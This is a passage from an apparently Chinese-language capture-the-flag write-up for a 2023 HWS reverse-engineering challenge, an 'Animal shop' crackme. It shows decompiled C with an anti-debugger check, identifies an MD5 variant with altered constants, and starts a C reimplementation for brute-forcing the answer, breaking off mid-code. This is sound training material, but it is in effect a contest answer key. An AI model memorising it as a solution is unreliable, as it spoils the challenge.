class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> anms_len; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// [rsp+68h] [rbp-2C8h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v12; <span class="comment">// [rsp+80h] [rbp-2B0h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v13; <span class="comment">// [rsp+98h] [rbp-298h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// [rsp+B0h] [rbp-280h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// [rsp+C8h] [rbp-268h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+E0h] [rbp-250h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+144h] [rbp-1ECh]</span></span><br><span class="line">  <span class="type">int</span> data[<span class="number">22</span>]; <span class="comment">// [rsp+148h] [rbp-1E8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> output[<span class="number">24</span>]; <span class="comment">// [rsp+1A0h] [rbp-190h] BYREF</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [rsp+1B8h] [rbp-178h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1BCh] [rbp-174h]</span></span><br><span class="line">  <span class="type">char</span> animals[<span class="number">256</span>]; <span class="comment">// [rsp+1C0h] [rbp-170h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+2C0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v24; <span class="comment">// [rsp+2C8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> *v25; <span class="comment">// [rsp+2D0h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> *v26; <span class="comment">// [rsp+2D8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> *v27; <span class="comment">// [rsp+2E0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> *v28; <span class="comment">// [rsp+2E8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+2F0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [rsp+300h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+304h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v30 = a1;</span><br><span class="line">  newthread[<span class="number">1</span>] = (<span class="type">pthread_t</span>)a2;</span><br><span class="line">  check_debugger();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  s = (_BYTE *)(<span class="string">"0. cat"</span> + <span class="number">3</span>);</span><br><span class="line">  v24 = (_BYTE *)(<span class="string">"1. dog"</span> + <span class="number">3</span>);</span><br><span class="line">  v25 = (_BYTE *)(<span class="string">"2. fox"</span> + <span class="number">3</span>);</span><br><span class="line">  v26 = (_BYTE *)(<span class="string">"3. panda"</span> + <span class="number">3</span>);</span><br><span class="line">  v27 = (_BYTE *)(<span class="string">"4. dragon"</span> + <span class="number">3</span>);</span><br><span class="line">  v28 = (_BYTE *)(<span class="string">"5. monkey"</span> + <span class="number">3</span>);</span><br><span class="line">  <span class="built_in">memset</span>(animals, <span class="number">0</span>, <span class="keyword">sizeof</span>(animals));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    input = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome Animal shop"</span>);</span><br><span class="line">    sub_400900();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input my favorite animal: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">switch</span> ( input )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        src = s;</span><br><span class="line">        v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">        <span class="built_in">strncat</span>(animals, src, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v15 = v24;</span><br><span class="line">        v4 = <span class="built_in">strlen</span>(v24);</span><br><span class="line">        <span class="built_in">strncat</span>(animals, v15, v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v14 = v25;</span><br><span class="line">        v5 = <span class="built_in">strlen</span>(v25);</span><br><span class="line">        <span class="built_in">strncat</span>(animals, v14, v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v13 = v26;</span><br><span class="line">        v6 = <span class="built_in">strlen</span>(v26);</span><br><span class="line">        <span class="built_in">strncat</span>(animals, v13, v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v12 = v27;</span><br><span class="line">        v7 = <span class="built_in">strlen</span>(v27);</span><br><span class="line">        <span class="built_in">strncat</span>(animals, v12, v7);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v11 = v28;</span><br><span class="line">        v8 = <span class="built_in">strlen</span>(v28);</span><br><span class="line">        <span class="built_in">strncat</span>(animals, v11, v8);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Input Err."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"done."</span>);</span><br><span class="line">  init_data((__int64)data);</span><br><span class="line">  anms_len = <span class="built_in">strlen</span>(animals);</span><br><span class="line"></span><br><span class="line">  sub_400B30(data, animals, anms_len);</span><br><span class="line"></span><br><span class="line">  sub_4059A0(data, (__int64)output);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( enc[j] != output[j] )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong."</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Win! , flag is flag{md5(input)}"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>主要函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  pthread_join(newthread[<span class="number">0</span>], <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"done."</span>);</span><br><span class="line">  init_data((__int64)data);</span><br><span class="line">  anms_len = <span class="built_in">strlen</span>(animals);</span><br><span class="line"></span><br><span class="line">  sub_400B30(data, animals, anms_len);</span><br><span class="line"></span><br><span class="line">  sub_4059A0(data, (__int64)output);</span><br></pre></td></tr></tbody></table></figure><p>使用插件findCrypt发现是魔改md5，魔改了常量值</p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717101555609.png" alt="image-20230717101555609"></p><p>密文 <code>CBA47BE5F01CD1955C8546A2B24FBD18</code></p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717102751322.png" alt="image-20230717102751322" style="zoom:50%;"><p>根据密文爆破即可</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_406140</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> <span class="type">int</span>)enc);</span><br><span class="line">  check_debugger();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">    enc[i] = enc[i] &amp; <span class="number">0xE9</span> | ~enc[i] &amp; <span class="number">0x16</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>md5解密脚本如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line">###头文件</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MD5_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MD5_H</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> count[<span class="number">2</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> state[<span class="number">4</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">}MD5_CTX;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> F(x,y,z) ((x &amp; y) | (~x &amp; z))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> G(x,y,z) ((x &amp; z) | (y &amp; ~z))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> H(x,y,z) (x^y^z)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I(x,y,z) (y ^ (x | ~z))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE_LEFT(x,n) ((x <span class="string">&lt;&lt; n) | (x &gt;</span>&gt; (32-n)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FF(a,b,c,d,x,s,ac) { \</span></span><br><span class="line"><span class="meta">a += F(b, c, d) + x + ac; \</span></span><br><span class="line"><span class="meta">a = ROTATE_LEFT(a, s); \</span></span><br><span class="line"><span class="meta">a += b; \</span></span><br><span class="line"><span class="meta">}</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GG(a,b,c,d,x,s,ac) { \</span></span><br><span class="line"><span class="meta">a += G(b, c, d) + x + ac; \</span></span><br><span class="line"><span class="meta">a = ROTATE_LEFT(a, s); \</span></span><br><span class="line"><span class="meta">a += b; \</span></span><br><span class="line"><span class="meta">}</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HH(a,b,c,d,x,s,ac) { \</span></span><br><span class="line"><span class="meta">a += H(b, c, d) + x + ac; \</span></span><br><span class="line"><span class="meta">a = ROTATE_LEFT(a, s); \</span></span><br><span class="line"><span class="meta">a += b; \</span></span><br><span class="line"><span class="meta">}</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> II(a,b,c,d,x,s,ac) { \</span></span><br><span class="line"><span class="meta">a += I(b, c, d) + x + ac; \</span></span><br><span class="line"><span class="meta">a = ROTATE_LEFT(a, s); \</span></span><br><span class="line"><span class="meta">a += b; \</span></span><br><span class="line"><span class="meta">}</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Init</span><span class="params">(MD5_CTX* context)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Update</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> inputlen)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Final</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">16</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> state[<span class="number">4</span>], <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">64</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Encode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">int</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">###</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"MD5.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _TCHAR char</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> PADDING[] = {</span><br><span class="line"><span class="number">0x80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> };</span><br><span class="line"><span class="comment">//魔改了</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Init</span><span class="params">(MD5_CTX* context)</span></span><br><span class="line">{</span><br><span class="line">context-&gt;count[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">context-&gt;state[<span class="number">0</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">context-&gt;state[<span class="number">1</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">context-&gt;state[<span class="number">2</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">context-&gt;state[<span class="number">3</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Update</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> inputlen)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>, index = <span class="number">0</span>, partlen = <span class="number">0</span>;</span><br><span class="line">index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">partlen = <span class="number">64</span> - index;</span><br><span class="line">context-&gt;count[<span class="number">0</span>] += inputlen &lt;&lt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (context-&gt;count[<span class="number">0</span>] &lt; (inputlen &lt;&lt; <span class="number">3</span>))</span><br><span class="line">context-&gt;count[<span class="number">1</span>]++;</span><br><span class="line">context-&gt;count[<span class="number">1</span>] += inputlen &gt;&gt; <span class="number">29</span>;</span><br><span class="line"><span class="keyword">if</span> (inputlen &gt;= partlen)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[index], input, partlen);</span><br><span class="line">MD5Transform(context-&gt;state, context-&gt;buffer);</span><br><span class="line"><span class="keyword">for</span> (i = partlen; i + <span class="number">64</span> &lt;= inputlen; i += <span class="number">64</span>)</span><br><span class="line">MD5Transform(context-&gt;state, &amp;input[i]);</span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[index], &amp;input[i], inputlen - i);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Final</span><span class="params">(MD5_CTX* context, <span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">16</span>])</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">0</span>, padlen = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> bits[<span class="number">8</span>];</span><br><span class="line">index = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">padlen = (index &lt; <span class="number">56</span>) ? (<span class="number">56</span> - index) : (<span class="number">120</span> - index);</span><br><span class="line">MD5Encode(bits, context-&gt;count, <span class="number">8</span>);</span><br><span class="line">MD5Update(context, PADDING, padlen);</span><br><span class="line">MD5Update(context, bits, <span class="number">8</span>);</span><br><span class="line">MD5Encode(digest, context-&gt;state, <span class="number">16</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Encode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">int</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (j &lt; len)</span><br><span class="line">{</span><br><span class="line">output[j] = input[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">1</span>] = (input[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">2</span>] = (input[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">output[j + <span class="number">3</span>] = (input[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">i++;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (j &lt; len)</span><br><span class="line">{</span><br><span class="line">output[i] = (input[j]) |</span><br><span class="line">(input[j + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">(input[j + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">(input[j + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">i++;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">MD5Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> state[<span 